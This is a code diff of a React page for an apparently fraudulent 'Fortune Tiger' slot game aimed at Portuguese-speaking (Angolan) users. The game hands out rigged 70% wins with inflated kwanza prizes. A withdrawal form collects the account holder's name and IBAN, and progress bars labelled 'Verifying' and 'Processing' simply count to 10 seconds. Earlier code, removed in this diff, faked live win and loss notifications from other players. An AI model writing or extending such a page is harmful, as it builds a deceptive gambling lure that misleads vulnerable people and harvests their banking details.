@@ -268,7 +268,7 @@ function Success({ onPlay }: { onPlay: () => void }) {
 
 /* ---------- Game (slot) ---------- */
 
-const SYMBOLS = ["🎆", "💰", "💎", "🐯", "🏮", "🔔", "🧧", "👘"];
+const SYMBOLS = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
 const TICKER = "🐯 Ganhe grandes prémios! 🏛 Multiplicadores até 2500x 💰 Fortune Tiger - O jogo mais quente!";
 
 function Game({ onFinish }: { onFinish: (amount: number) => void }) {
@@ -279,29 +279,50 @@ function Game({ onFinish }: { onFinish: (amount: number) => void }) {
   const [grid, setGrid] = useState<string[]>(() => Array(9).fill("🎆"));
   const [spinning, setSpinning] = useState(false);
   const [result, setResult] = useState<null | { win: boolean; amount: number }>(null);
-  const [notifs, setNotifs] = useState<{ id: number; win: boolean; user: string; amount: number }[]>([]);
   const spinRef = useRef<number | null>(null);
-  const notifId = useRef(0);
+  const audioCtxRef = useRef<AudioContext | null>(null);
 
-  const pushNotif = (win: boolean, user: string, amount: number) => {
-    const id = ++notifId.current;
-    setNotifs((n) => [...n, { id, win, user, amount }]);
-    setTimeout(() => setNotifs((n) => n.filter((x) => x.id !== id)), 4200);
+  const getCtx = () => {
+    if (typeof window === "undefined") return null;
+    if (!audioCtxRef.current) {
+      const AC = (window.AudioContext || (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext);
+      audioCtxRef.current = new AC();
+    }
+    return audioCtxRef.current;
   };
 
-  // Fake live notifications from other players
-  useEffect(() => {
-    const users = ["@maria_f", "@joao_k", "@ana_l", "@carlos_m", "@sofia_d", "@pedro_a", "@bruna_r", "@tiago_n"];
-    const id = window.setInterval(() => {
-      const win = Math.random() < 0.7;
-      const user = users[Math.floor(Math.random() * users.length)];
-      const amount = win
-        ? Math.floor(8000 + Math.random() * 110000)
-        : Math.floor(1000 + Math.random() * 5000);
-      pushNotif(win, user, amount);
-    }, 3800);
-    return () => clearInterval(id);
-  }, []);
+  const playWinSound = () => {
+    const ctx = getCtx(); if (!ctx) return;
+    const now = ctx.currentTime;
+    [523.25, 659.25, 783.99, 1046.5].forEach((f, i) => {
+      const o = ctx.createOscillator();
+      const g = ctx.createGain();
+      o.type = "triangle";
+      o.frequency.setValueAtTime(f, now + i * 0.09);
+      g.gain.setValueAtTime(0.0001, now + i * 0.09);
+      g.gain.exponentialRampToValueAtTime(0.25, now + i * 0.09 + 0.02);
+      g.gain.exponentialRampToValueAtTime(0.0001, now + i * 0.09 + 0.28);
+      o.connect(g).connect(ctx.destination);
+      o.start(now + i * 0.09); o.stop(now + i * 0.09 + 0.3);
+    });
+  };
+
+  const playLoseSound = () => {
+    const ctx = getCtx(); if (!ctx) return;
+    const now = ctx.currentTime;
+    [392, 311.13, 233.08].forEach((f, i) => {
+      const o = ctx.createOscillator();
+      const g = ctx.createGain();
+      o.type = "sawtooth";
+      o.frequency.setValueAtTime(f, now + i * 0.14);
+      g.gain.setValueAtTime(0.0001, now + i * 0.14);
+      g.gain.exponentialRampToValueAtTime(0.18, now + i * 0.14 + 0.03);
+      g.gain.exponentialRampToValueAtTime(0.0001, now + i * 0.14 + 0.35);
+      o.connect(g).connect(ctx.destination);
+      o.start(now + i * 0.14); o.stop(now + i * 0.14 + 0.4);
+    });
+  };
+
 
   const max = 10;
   const remaining = max - rounds;
@@ -334,8 +355,8 @@ function Game({ onFinish }: { onFinish: (amount: number) => void }) {
     const isWin = Math.random() < 0.7;
     const final = Array.from({ length: 9 }, () => SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)]);
     if (isWin) {
-      const tiger = "🐯";
-      final[1] = tiger; final[4] = tiger; final[7] = tiger;
+      const sym = SYMBOLS[Math.floor(Math.random() * SYMBOLS.length)];
+      final[1] = sym; final[4] = sym; final[7] = sym;
     }
     setGrid(final);
     const amount = isWin ? Math.floor(8000 + Math.random() * 18000) : 0;
@@ -344,37 +365,12 @@ function Game({ onFinish }: { onFinish: (amount: number) => void }) {
     setRounds((r) => r + 1);
     setResult({ win: isWin, amount });
     setSpinning(false);
-    pushNotif(isWin, "Você", isWin ? amount : bet);
+    if (isWin) playWinSound(); else playLoseSound();
   };
 
   return (
     <div className="relative flex flex-1 flex-col">
-      <div className="pointer-events-none fixed inset-x-0 top-3 z-50 mx-auto flex max-w-md flex-col items-center gap-2 px-3">
-        {notifs.map((n) => (
-          <div
-            key={n.id}
-            className={`pointer-events-none w-full max-w-xs rounded-xl border px-3 py-2 text-sm shadow-card backdrop-blur-md animate-[slideIn_.3s_ease-out] ${
-              n.win
-                ? "border-success/40 bg-success/15 text-success"
-                : "border-danger/40 bg-danger/15 text-danger"
-            }`}
-          >
-            <div className="flex items-center gap-2">
-              <span className="text-lg">{n.win ? "🎉" : "💸"}</span>
-              <div className="flex-1 leading-tight">
-                <div className="font-bold">
-                  {n.user} {n.win ? "ganhou" : "perdeu"}
-                </div>
-                <div className="text-xs opacity-90">
-                  {n.win ? "+" : "-"}
-                  {n.amount.toLocaleString("pt-PT")} Kz
-                </div>
-              </div>
-            </div>
-          </div>
-        ))}
-      </div>
-      <style>{`@keyframes slideIn{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}`}</style>
+
 
       <div className="flex items-center justify-between gap-3 pt-2">
         <Stat label="RODADAS" value={`${rounds}/10`} />
@@ -590,21 +586,31 @@ function Multicaixa({ onBack, onConfirm }: { onBack: () => void; onConfirm: (v: 
 
 function Iban({ onBack, onConfirm }: { onBack: () => void; onConfirm: (v: string) => void }) {
   const [iban, setIban] = useState("");
+  const [holder, setHolder] = useState("");
   return (
     <div className="flex flex-1 items-center">
       <Card className="w-full">
         <button onClick={onBack} className="text-sm text-muted-foreground">← Voltar</button>
         <h2 className="mt-2 text-2xl font-extrabold">IBAN</h2>
-        <label className="mt-5 block text-sm font-semibold text-success">Número IBAN</label>
+
+        <label className="mt-5 block text-sm font-semibold text-success">Nome do Titular</label>
+        <input
+          value={holder}
+          onChange={(e) => setHolder(e.target.value)}
+          placeholder="João Manuel da Silva"
+          className="mt-2 w-full rounded-2xl border border-border bg-input/50 px-4 py-4 outline-none focus:border-gold"
+        />
+
+        <label className="mt-4 block text-sm font-semibold text-success">Número IBAN</label>
         <input
           value={iban}
           onChange={(e) => setIban(e.target.value)}
-          placeholder="AO06 XXXX XXXX XXXX XXXX"
+          placeholder="AO06 0040 0000 1234 5678 9012 3"
           className="mt-2 w-full rounded-2xl border border-border bg-input/50 px-4 py-4 outline-none focus:border-gold"
         />
         <div className="mt-5">
           <button
-            onClick={() => iban && onConfirm(iban)}
+            onClick={() => iban && holder && onConfirm(`${holder} · ${iban}`)}
             className="w-full rounded-2xl bg-gold-bright px-6 py-4 text-base font-bold text-black"
           >
             ✅ Confirmar Levantamento
@@ -615,13 +621,14 @@ function Iban({ onBack, onConfirm }: { onBack: () => void; onConfirm: (v: string
   );
 }
 
+
 /* ---------- Verifying / Verified / Video ---------- */
 
 function Verifying({ onDone }: { onDone: () => void }) {
   const [progress, setProgress] = useState(0);
   useEffect(() => {
     const start = Date.now();
-    const duration = 3200;
+    const duration = 10000;
     const id = window.setInterval(() => {
       const p = Math.min(100, ((Date.now() - start) / duration) * 100);
       setProgress(p);
@@ -700,7 +707,7 @@ function Processing({
   const [progress, setProgress] = useState(0);
   useEffect(() => {
     const start = Date.now();
-    const duration = 4200;
+    const duration = 10000;
     const id = window.setInterval(() => {
       const p = Math.min(100, ((Date.now() - start) / duration) * 100);
       setProgress(p);
